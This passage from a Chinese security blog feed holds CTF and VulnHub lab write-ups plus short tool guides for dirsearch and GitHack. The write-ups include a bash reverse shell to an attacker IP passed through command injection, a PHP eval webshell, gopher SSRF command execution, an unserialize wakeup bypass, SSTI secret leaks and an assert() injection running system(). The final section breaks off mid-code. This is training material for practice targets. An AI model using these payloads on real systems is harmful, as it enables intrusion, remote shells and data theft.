class="headerlink" title="登录后台"></a>登录后台</h3><p>(1) 使用解密出来的密码尝试登录扫描出来的23端口ssh都失败：</p><p>(2) 使用sarah、密码bulldoglover成功登录管理后台，发现没有编辑权限。</p><p>去 admin 页面登陆试试</p><p>尝试使用用户名<a href="mailto:&#x6e;&#x69;&#99;&#x6b;&#64;&#x62;&#x75;&#x6c;&#x6c;&#x64;&#x6f;&#103;&#x69;&#110;&#100;&#x75;&#x73;&#116;&#114;&#105;&#101;&#115;&#46;&#x63;&#111;&#x6d;">&#x6e;&#x69;&#99;&#x6b;&#64;&#x62;&#x75;&#x6c;&#x6c;&#x64;&#x6f;&#103;&#x69;&#110;&#100;&#x75;&#x73;&#116;&#114;&#105;&#101;&#115;&#46;&#x63;&#111;&#x6d;</a>和sarah@bulldogindustries.com和对应的密码bulldog和bulldoglover登陆，发现登陆不了。</p><p>然后尝试使用nick和bulldog登陆，发现可以登陆。</p><p>进去之后发现都没有权限。</p><pre><code>You don&#39;t have permission to edit anything.</code></pre><p>现在我们找到了两组用户名和密码，记下来可能等会要用</p><pre><code>nick---bulldogsarah---bulldoglover</code></pre><p>(3) 再去访问webshell页面，已通过认证，可执行命令，这是一个命令执行界面：</p><p>想到之前那个webshell，需要认证后使用，我们登陆后查看shell页面，果然可以使用了</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_6.png"></p><p>不过好像只能用系统给出的几个命令。先试一下有没有命令注入</p><h3 id="绕过白名单限制进行命令注入、shell反弹"><a href="#绕过白名单限制进行命令注入、shell反弹" class="headerlink" title="绕过白名单限制进行命令注入、shell反弹"></a>绕过白名单限制进行命令注入、shell反弹</h3><p>在输入框里输入 ifconfig &amp; whoami</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_7.png"></p><p>根据反馈结果判断存在命令注入，那接下来就好办了。</p><p>在攻击机kali中打开命令终端开始监听，输入nc -lvnp 6666</p><p>尝试bash反弹，在靶机打开的网页命令框中输入</p><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.15.121/6666 0&gt;&amp;1</code></pre><p>结果返回</p><pre><code>Command : nc -lvnp 6666INVALID COMMAND. I CAUGHT YOU HACKER!</code></pre><p>换一种方式</p><pre><code>ls &amp;bash -i &gt;&amp; /dev/tcp/192.168.15.121/6666 0&gt;&amp;1</code></pre><p>服务器报错500。</p><p>多次尝试之后，使用echo命令反弹shell成功</p><pre><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.15.121/6666 0&gt;&amp;1&quot; | bash</code></pre><p>接下来就是提权了</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_8.png"></p><h3 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h3><p>首先查看有哪些系统用户</p><pre><code>cat /etc/passwd</code></pre><p>发现了一个重点对象</p><pre><code>bulldogadmin</code></pre><p>然后，查找他的文件  </p><pre><code>find / -user bulldogadmin 2&gt;/dev/null</code></pre><p>发现有hiddenadmindirectory隐藏目录，用less命令打开里面包含的文件看看</p><pre><code>less /home/bulldogadmin/.hiddenadmindirectory/note</code></pre><p>同样的方式打开另一个文件查看一下</p><pre><code>less /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp</code></pre><p>发现customPermissionApp里面包含的都是字符，输入命令</p><pre><code>strings /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp     </code></pre><p>查看此文件</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_9.png"></p><p>很轻松地看出文件中间有一个被 H 打断的PASSWORD单词。于是把前后字段去掉H，得到一句</p><pre><code>SUPERultimatePASSWORDyouCANTget   </code></pre><p>把它保存着，这可能是我们会要用到的密码</p><p>su命令执行一下</p><pre><code>su: must be run from a terminal 需要一个终端</code></pre><p>上网查了一下资料，可以用python调用本地的shell，命令：</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>然后执行命令</p><pre><code>sudo su -</code></pre><p>输入刚才记下来的的密码试一下，结果成功获得root权限</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_10.png"></p><p>输入ls命令，发现里面只有一个文本文档 congrats.txt</p><p>输入</p><pre><code>cat congrats.txt</code></pre><p>打开看下</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_11.png"></p><p>如果无法解决su，还记得有23端口的ssh，也可以使用Xshell通过ssh登录，登录成功后执行sudo su – 提权并获得flag</p><p>成功完成了Bulldog靶机实战</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>(1) 发现和破解sha1：在dev页面查看源码，发现多个用户hash后，即使不知道是40位的sha1，也可以直接去cmd5破解，系统会自动识别，可以破解出2个账号。如果用hashcat暴破sha1，需要强大的字段和较长的时间。</p><p>(2) 反弹shell应该有多种方法：第一个想到的是bash shell，也想到了python反弹shell。只尝试了通过bash反弹shell，如果bash反弹不成功，可尝试往系统echo文件，赋予+x执行权限，执行脚本反弹。也可尝试Python是否能够反弹shell。</p><p>(3) 发现隐藏的包含root密码的文件，通过搜索id为1000之后的用户文件，查看历史命令，或者查看目录，也可能找到。</p><p>(4) 猜解root密码：这个是最难的，找到这个文件并不难，但是通过strings查看文件内容，并且拼接字符串为root密码，感觉难度很大。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>目录爆破工具——dirsearch</title>
      <link href="2020/08/05/2020-08-05-dirsearch/"/>
      <url>2020/08/05/2020-08-05-dirsearch/</url>
      
        <content type="html"><![CDATA[<p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>可保持连接</li><li>支持多种后缀（-e|–extensions asp,php）</li><li>生成报告（纯文本，JSON）</li><li>启发式检测无效的网页</li><li>递归的暴力扫描</li><li>支持HTTP代理</li><li>用户代理随机化</li><li>批量处理</li><li>请求延迟</li><li>扫描器与字典</li></ul><h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>例如</p><pre><code>python dirsearch.py -u 10.0.3.45 -e phppython dirsearch.py -u http://220.249.52.133:41417 -e *</code></pre><p>常用参数</p><pre><code>-u 指定url-e 指定网站语言-w 可以加上自己的字典（带上路径）-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）--random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）</code></pre><p>db目录是此款工具自带的字典，reports目录是你所有爬过的网站</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git泄漏利用——GitHack</title>
      <link href="2020/08/05/2020-08-05-githack/"/>
      <url>2020/08/05/2020-08-05-githack/</url>
      
        <content type="html"><![CDATA[<p>当运维或者开发使用自动部署的方式，如果配置不当，会将.git文件夹直接部署到线上环境，造成git泄露漏洞。</p><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。</p><p>Git信息泄露的危害很大，渗透测试人员、攻击者，可直接从源码获取敏感配置信息（如：邮箱，数据库），也可以进一步审计代码，挖掘文件上传、SQL注射等安全漏洞</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li><p>解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )</p></li><li><p>去.git/objects/ 文件夹下下载对应的文件</p></li><li><p>zlib解压文件，按原始的目录结构写入源代码</p></li></ol><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li><p>速度快，默认20个工作线程</p></li><li><p>尽量还原所有的源代码，缺失一部分文件不影响脚本工作</p></li><li><p>脚本不需要执行额外的git命令，有python就够了</p></li></ol><h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>切换到GitHack的路径下(需要使用python2)</p><pre><code>python GitHack.py http://www.xxxx.xxx/.git/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 web进阶题 xx-xx</title>
      <link href="2020/08/04/2020-08-04-CTF_world_web_advance_10/"/>
      <url>2020/08/04/2020-08-04-CTF_world_web_advance_10/</url>
      
        <content type="html"><![CDATA[- Background_Management_System## Background_Management_System1.目测首先打开看到提示是个管理系统，提示是1.网站管理员 2.不在数据库里面，尝试admin'or 1=1#万能密码登陆。失败，随便注册一个用户登陆进去，看要求是管理登陆就会得到hint(提示)。2.扫描对网站进行敏感目录扫描。有www.zip得到源码看来是要进行代码审计，目录下还有shell.php的php，不过限制了内网，可能是有ssrf。3.代码审计Userinfo.php中发现登陆验证以及修改密码等    $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";假如我们修改的是admin'#用户的密码，这句sql就变成了    $sql = "UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass' ";后半部分注释掉    $sql = "UPDATE users SET PASSWORD='$pass' where username='admin'所以我们需要注册一个用户名admin'#开头的用户，然后登陆修改密码，同时也就修改了admin的密码，可以登陆。4.端口扫描登陆拿到hint 提示的ssrf页面55ceedfbc97b0a81277a55506c34af36.php，ssrf对很多协议进行了过滤，只有gopher可以，经过对端口扫描测试，有80和3306端口，gopher80端口可以直接利用shell.php经验:内网扫端口，可以用burp爆破端口,大概就是看返回报大小判断内容。55ceedfbc97b0a81277a55506c34af36.php 源码    <?php     echo 'please get $url';            $url = $_GET['url'] ?? false;         if($url)          {         $a = preg_match("/gopher/i", $url);            if ($a==0)            {                                 echo "<br />";                echo "操作错误，你是我们的内网人员吗";                exit();                             }                     $ch = curl_init();                 curl_setopt($ch, CURLOPT_URL, $_GET["url"]);                 curl_setopt($ch, CURLOPT_HEADER, 0);                 curl_exec($ch);                 curl_close($ch);             }         ?>5.Gopher GET/POSTgopher要对符号进行二次url编码,注意:‘?’一定要二次编码  system 系统命令 空格用+替代，也可以url编码成%2b    http://220.249.52.133:57433/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253fcmd=ls%2B-a    . .. .htaccess 55ceedfbc97b0a81277a55506c34af36.php favicon.ico index.php robots.txt router.php shell.php static www.zip     http://220.249.52.133:57433/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=find%2B/%2B-name%2Bflag    /flag     http://220.249.52.133:57433/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=cat%2B/flag    flag{4e8f794089b6b4ef55cd0399dca1433c}参考https://www.cnblogs.com/Zhu013/p/12540419.htmlhttps://blog.csdn.net/qq_43147039/article/details/103085174[了解SSRF,这一篇就足够了](https://xz.aliyun.com/t/2115)[SSRF与内网MYSQL学习记录](https://www.cnblogs.com/Zhu013/p/12505090.html)[gopher 协议在SSRF 中的一些利用](https://xz.aliyun.com/t/6993)[Gopher协议在SSRF漏洞中的深入研究](https://www.cnblogs.com/zhangqianxi/p/13337622.html)https://github.com/tarunkant/Gopherus]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 web进阶题 11-20</title>
      <link href="2020/08/04/2020-08-04-CTF_world_web_advance_2/"/>
      <url>2020/08/04/2020-08-04-CTF_world_web_advance_2/</url>
      
        <content type="html"><![CDATA[11. NaNNaNNaNNaN-Batman12. PHP213. upload114. Web_php_unserialize15. easytornado16. shrine17. lottery18. mfw19. web220. fakebook## NaNNaNNaNNaN-Batman下载附件，有乱码，但可以发现是js代码。用浏览器打开出现一个搜索框，但没有什么反应。    <script>_='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){[0]);.splice(0,1)}}}\'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["write(s[o%4]buttonif(e.ment';for(Y in $='')with(_.split($[Y]))_=join(pop());eval(_)</script>审计代码可以看到最开始的下划线“\_”是一个变量，其内容是一个函数的代码，而最后又是一个eval(_)，这里执行了_变量中的内容也就是''中的内容。但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容。但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来。    function $() {        var e = document.getElementById("c").value;        if (e.length == 16)            if (e.match(/^be0f23/) != null)                if (e.match(/233ac/) != null)                    if (e.match(/e98aa$/) != null)                        if (e.match(/c7be9/) != null) {                            var t = ["fl", "s_a", "i", "e}"];                            var n = ["a", "_h0l", "n"];                            var r = ["g{", "e", "_0"];                            var i = ["it'", "_", "n"];                            var s = [t, n, r, i];                            for (var o = 0; o < 13; ++o) {                                document.write(s[o % 4][0]);                                s[o % 4].splice(0, 1)                            }                        }    }    document.write('<input id="c"><button onclick=$()>Ok</button>');    delete _不用根据这些个变量和document.write去算flag，拿到flag有两种方法：1）满足正则首先，满足length==16，正则的话^为开始符号，$为结尾符号，拼接一下：be0f233ac7be98aa，输入就拿到flag了。2）将下面这段拿到控制台执行一下即可：    var t=["fl","s_a","i","e}"];    var n=["a","_h0l","n"];    var r=["g{","e","_0"];    var i=["it'","_","n"];    var s=[t,n,r,i];    for(var o=0;o<13;++o){        document.write(s[o%4][0]);s[o%4].splice(0,1)        }## PHP2扫了下端口和目录，没发现啥有用的信息。看了提示，需要用到php源文件phps(之前没听说过)访问index.phps 出现源码    <?php    if("admin"===$_GET[id]) {    echo("<p>not allowed!</p>");    exit();    }    $_GET[id] = urldecode($_GET[id]);    if($_GET[id] == "admin")    {    echo "<p>Access granted!</p>";    echo "<p>Key: xxxxxxx </p>";    }    ?>    Can you anthenticate to this website?payload:    index.php?id=%2561%2564%256d%2569%256e    index.php?id=%2561dmin此处原理是php对传进来的参数id自动进行一次url解码，但"admin"===$_GET[id]返回false,然后urldecode再次对解码后的结果进行解码。解码结果为admin。此时admin==admin，返回true,拿到flag.此处附一张url编码表：![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20190731140712210.png)知识点：    php备份文件：后缀为php~或者index.php.bak    php的源代码文件：后缀为phps    ===是包括变量值与类型完全相等，而==只是比较两个数的值是否相等## upload1选择文件上传，查看源码    <!Doctype html>    <html>    <head>    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />    <script type="text/javascript">        Array.prototype.contains = function (obj) {          var i = this.length;          while (i--) {              if (this[i] === obj) {                  return true;              }          }          return false;      }      function check(){    upfile = document.getElementById("upfile");    submit = document.getElementById("submit");    name = upfile.value;    ext = name.replace(/^.+\./,'');    if(['jpg','png'].contains(ext)){        submit.disabled = false;    }else{        submit.disabled = true;        alert('请选择一张图片文件上传!');    }    }    </script>    </head>    <body>    <form enctype='multipart/form-data' id='aa' name='aaa' method='post' action='index.php'>     <input  id="upfile" name='upfile' type='file' onchange="check();" />     <input type='submit'  id ='submit' value='上传'>     </form>     </body>    </html>ext = name.replace(/^.+./,’’) 删除文件的名称if([‘jpg’,‘png’].contains(ext))检查后缀是否为jpg，如果不是就禁用按钮并弹窗报错过滤是在前端，所以我们编写一句话木马1.txt<?php @eval($_POST['shell']);?>并修改后缀为jpg或者png，之后上传。BP抓包之后改后缀名，放行。发现返回网页 upload success : upload/1595487399.1.php 此时菜刀连接http://220.249.52.133:37062/upload/1595487399.1.php ，看到有flag.php文件，访问后获得flag.## Web_php_unserialize题目代码审计    <?php     class Demo {         private $file = 'index.php';        public function __construct($file) {             $this->file = $file;  //构造函数，对类的变量进行初始化        }        function __destruct() {             echo @highlight_file($this->file, true);         }        //魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法        function __wakeup() {             if ($this->file != 'index.php') {                 //the secret is in the fl4g.php                $this->file = 'index.php';             }         }     }    if (isset($_GET['var'])) {         $var = base64_decode($_GET['var']);         //正则匹配，如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式})，不区分大小写，就输出stop hacking!否则的话就进行反序列化        if (preg_match('/[oc]:\d+:/i', $var)) {             die('stop hacking!');         } else {            @unserialize($var);         }     } else {         highlight_file("index.php");     }     ?>审计完成之后，思路就很清晰了，对Demo这个类进行序列化，base64加密之后，赋值给var变量进行get传参就行了在类Demo中有三个方法，一个构造，一个析构，还有就是一个魔术方法构造函数__construct()在程序执行开始的时候对变量进行赋初值析构函数__destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。在反序列化执行之前，会先执行__wakeup这个魔术方法，所以需要绕过，当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。代码：    <?php     class Demo {         private $file = 'index.php';        public function __construct($file) {             $this->file = $file;         }        function __destruct() {             echo @highlight_file($this->file, true);         }        function __wakeup() {             if ($this->file != 'index.php') {                 //the secret is in the fl4g.php                $this->file = 'index.php';             }         }     }        $A = new Demo('fl4g.php');        $b = serialize($A);        echo $b;        $b = str_replace('O:4', 'O:+4',$b);//绕过preg_match        echo $b;        $b = str_replace(':1:', ':2:',$b);//绕过wakeup        echo $b;        echo base64_encode($b);    ?>利用php调试执行结果为：    O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}    O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}    O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}    TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==用+4替换成4是为了绕过preg_match的正则表达式同样的把2替换成1是利用了CVE-2016-7124的漏洞，即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行这里有个坑，这里的file变量为私有变量，所以序列化之后的表示方式是在变量名前加上%00类名%00，字符串长度也比实际长度大2。类似的还有protected类型的变量，序列化之后字符串首部会加上%00*%00。php是为了区别这些属性所以进行了一些修饰，利用的就是这个乱码%00（url编码，hex就是0x00），表示的是NULL。最后按照题目的意思encode一下base64就获取反序列化的结果，get传参即可    ?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==知识点：[PHP反序列化漏洞简介及相关技巧小结](https://cloud.tencent.com/developer/article/1485821)## easytornadotornado是python中的一个web应用框架。拿到题目发现有三个文件：(1)flag.txt    /flag.txt    flag in /fllllllllllllag发现flag在/fllllllllllllag文件里；(2)welcome.txt    /welcome.txt    renderrender是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。(3)hints.txt    /hints.txt    md5(cookie_secret+md5(filename))filehash=md5(cookie_secret+md5(filename)) 现在filename=/fllllllllllllag，只需要知道cookie_secret的既能访问flag。测试后发现还有一个error界面，格式为/error?msg=Error，怀疑存在服务端模板注入攻击 （SSTI）尝试/error?msg={{datetime}} 在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考Tornado官方文档通过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名    RequestHandler.settings    An alias for self.application.settings.handler指向的处理当前这个页面的RequestHandler对象， RequestHandler.settings指向self.application.settings， 因此handler.settings指向RequestHandler.application.settings。构造payload获取cookie_secret    http://220.249.52.133:49325/error?msg={{handler.settings}}    {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '300da6b0-b937-44a8-a3df-6a44a8660750'} 计算filehash值:    import hashlib    def md5(s):        return hashlib.md5(s).hexdigest()    def filehash():        filename = b'/fllllllllllllag'        cookie_secret = '300da6b0-b937-44a8-a3df-6a44a8660750'        print(md5((cookie_secret+md5(filename)).encode('utf-8')))    if __name__ == '__main__':        filehash()payload：    http://220.249.52.133:49325/file?filename=/fllllllllllllag&filehash=2238c86521369cdb6ef6b58d15dc9433成功获取flag。## shrine源码    import flask    import os    app = flask.Flask(__name__)    app.config['FLAG'] = os.environ.pop('FLAG')    @app.route('/')    def index():        return open(__file__).read()    @app.route('/shrine/<path:shrine>')    def shrine(shrine):        def safe_jinja(s):            s = s.replace('(', '').replace(')', '')            blacklist = ['config', 'self']            return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s        return flask.render_template_string(safe_jinja(shrine))    if __name__ == '__main__':        app.run(debug=True)首先在shrine路径下测试ssti能正常执行    http://220.249.52.133:31107/shrine/{{7*7}}代码审计    app.config['FLAG'] = os.environ.pop('FLAG')注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接{{config}}即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]，并且过滤了括号    return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s上面这行代码把黑名单的东西遍历并设为空，例如：    http://220.249.52.133:31107/shrine/{{config}}返回结果    None不过python还有一些内置函数，比如url_for和get_flashed_messages    http://220.249.52.133:31107/shrine/{{url_for.__globals__}}    http://220.249.52.133:31107/shrine/{{get_flashed_messages.__globals__}}看到current_app意思应该是当前app，查看当前app下的config，即payload：    http://220.249.52.133:31107/shrine/{{url_for.__globals__['current_app'].config}}    http://220.249.52.133:31107/shrine/{{get_flashed_messages.__globals__['current_app'].config}}## lottery考察 .git泄露、php源码审计、弱类型利用打开链接发现是一个买彩票的网站，但是要买flag钱不够使用dirsearch爆破url     python dirsearch.py -u http://220.249.52.133:41417 -e *发现Git泄露,存在.git文件夹，这里使用工具GitHack，下载地址https://github.com/lijiejie/GitHack打开api.php文件发现，里面有一段是抽奖的代码，主要是通过输入的数据和这里的随机数进行比较，看相等的数字，中的钱就越大，应用了弱比较==，这里没有进行任何过滤，可以用true绕过![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/202085-43803.jpg)    function buy($req){        require_registered();        require_min_money(2);        $money = $_SESSION['money'];        $numbers = $req['numbers'];        $win_numbers = random_win_nums();        $same_count = 0;        for($i=0; $i<7; $i++){            if($numbers[$i] == $win_numbers[$i]){                $same_count++;            }        }        switch ($same_count) {            case 2:                $prize = 5;                break;            case 3:                $prize = 20;                break;            case 4:                $prize = 300;                break;            case 5:                $prize = 1800;                break;            case 6:                $prize = 200000;                break;            case 7:                $prize = 5000000;                break;            default:                $prize = 0;                break;        }        $money += $prize - 2;        $_SESSION['money'] = $money;        response(['status'=>'ok','numbers'=>$numbers, 'win_numbers'=>$win_numbers, 'money'=>$money, 'prize'=>$prize]);    }requests是json格式的,比较彩票数字与用户数字采用==弱比较,而且是一位一位的比较的,由于 json 支持布尔型数据，那么就可以构造一串数组[true,true,true,true,true,true,true]传入，因为布尔值true和任意字符串都弱相等。![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/202085-44034.jpg)PHP弱类型小知识 详细可以参考[php 弱类型总结](https://www.cnblogs.com/Mrsm1th/p/6745532.html)    PHP有两种比较符号==与===    === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较    == 在进行比较的时候，会先将字符串类型转化成相同，再比较在输入抽奖数字页面，进行抓包，把number的值改成数组    {"action":"buy","numbers":[true,true,true,true,true,true,true]}多go几下钱变多，就可以买flag了![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/202085-44631.jpg)## mfw由About页面中提示 Git/PHP/Bootstrap 猜测可能有git泄漏利用dirsearch跑一下，果然存在githack下载泄漏源码查看index.php文件内容得到PHP关键代码：    <?php    if (isset($_GET['page'])) {        $page = $_GET['page'];    } else {        $page = "home";    }    $file = "templates/" . $page . ".php";    // I heard '..' is dangerous!    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");    // TODO: Make this look nice    assert("file_exists('$file')") or die("That file doesn't exist!");    ?>    几个函数    assert() 检查一个断言是否为 FALSE。 assert()函数会将括号中的字符当成代码来执行，并返回true或false。    strpos() 函数查找字符串在另一字符串中第一次出现的位置。如果没有找到则返回False。代码中不允许输入的字符中包含连续的两个点，否则就返回错误。这段代码中只用黑名单过滤了连个点，我们可以想办法绕过。    file_exists() 函数检查文件或目录是否存在。注入处    $file = "templates/" . $page . ".php";    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");     assert("file_exists('$file')") or die("That file doesn't exist!"); 利用assert特性    bool assert(mixed $assertion[,string $description])，如果assertion是字符串，他会被assert()当做php代码执行。     思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。对strpos/file_exists函数进行闭合，构造一下    ?page=') or phpinfo();//    $file = "templates/') or phpinfo();//.php";    assert("strpos('templates/') or phpinfo();//.php', '..') === false") or die("Detected hacking attempt!");    assert("file_exists('templates/') or phpinfo();//.php')") or die("That file doesn't exist!"); 构造payload，使用cat查看flag.php的内容，查看网页源码才能获取Flag    ?page=') or system("cat templates/flag.php");//    $file = "templates/') or system("cat templates/flag.php");//.php";    assert("strpos('templates/') or system("cat templates/flag.php");//.php', '..') === false") or die("Detected hacking attempt!");    assert("file_exists('templates/') or system("cat templates/flag.php");//.php") or die("That file doesn't exist!"); ## web2把给出的字符串逆向解密就能得到flag简单审计一下代码    <?php    $miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";    function encode($str){        $_o=strrev($str);  //反转字符串        // echo $_o;                    for($_0=0;$_0<strlen($_o);$_0++){  //循环字符串长度                    $_c=substr($_o,$_0,1);  //从$_0位置开始，返回1个字符            $__=ord($_c)+1;  //返回字符串首个字母的ASCII值 + 1            $_c=chr($__);  //返回指定进制的ASCII值            $_=$_.$_c;   //拼接两个变量的内容 赋值        }         return str_rot13(strrev(base64_encode($_)));  //返回  ROT13 编码/解码(反转字符串(base64加密($_)))  的结果    }    highlight_file(__FILE__);  //返回高亮代码    /*    逆向加密算法，解密$miwen就是flag    */    ?>  PHP内置函数    strrev(string): 反转字符串    strlen(string): 返回字符串的长度    substr(string, start, length): 返回字符串的一部分        string: 所需要的字符串        start: 在字符串何处开始        length: 可选。规定被返回字符串的长度。默认是直到字符串的结尾    ord(string): 返回字符串首个字符的 ASCII 值    chr(): 从指定的 ASCII 值返回对应的字符    str_rot13(string): 对字符串执行 ROT13 编码。ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。编码和解码都是由该函数完成的。如果把已编码的字符串作为参数，那么将返回原始字符串    base64_encode(string): 使用 MIME base64 对数据进行编码写出逆向代码    <?php    $str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';    $_ = base64_decode(strrev(str_rot13($str)));    $_o=NULL;    for($_0=0;$_0<strlen($_);$_0++){              $_c=substr($_,$_0,1);              $__=ord($_c)-1;              $_c=chr($__);              $_o=$_o.$_c;           }     echo strrev($_o);    ?>## fakebook参考：https://blog.csdn.net/qq_41500251/article/details/105383065?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-2-105383065.nonecase扫描目录 dirsearch 御剑发现隐藏的robots.txt和flag.php查看flag.php，但是响应内容为空。如果我们确定了一个页面存在，访问后页面内容为空，有两种情况，要么页面本身就没有内容。再来就是没有访问权限，服务器禁止通过HTTP直接请求flag.php文件。那接下来我们所有的思路就可以明确，就是要找系统中能够访问flag.php的其他方式。（SSRF，服务器端请求伪造，全称Server-Side Request Forgery，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。现在，我们通过浏览器直接访问flag.php内容并不返回内容，这个请求对于服务器来说是外部请求。当攻击者可以通过SSRF让服务器内部功能访问flag文件时，这种外部禁止访问的限制也就会相应消失。）再来看robots.txt，其中有源码泄漏（/user.php.bak），输入到地址栏，得到文件user.php.bak。user.php.bak源码：    <?php    class UserInfo    {        public $name = "";        public $age = 0;        public $blog = "";        public function __construct($name, $age, $blog)        {            $this->name = $name;            $this->age = (int)$age;            $this->blog = $blog;        }        function get($url)        {            $ch = curl_init();                                   //初始化一个curl会话            curl_setopt($ch, CURLOPT_URL, $url);                 //设置需要抓取的URL            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         //设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上            $output = curl_exec($ch);                            //运行cURL，请求网页            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);            if($httpCode == 404) {                return 404;            }            curl_close($ch);          //关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄            return $output;        }        public function getBlogContents ()        {            return $this->get($this->blog);        }        public function isValidBlog ()        {            $blog = $this->blog;            return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);        }    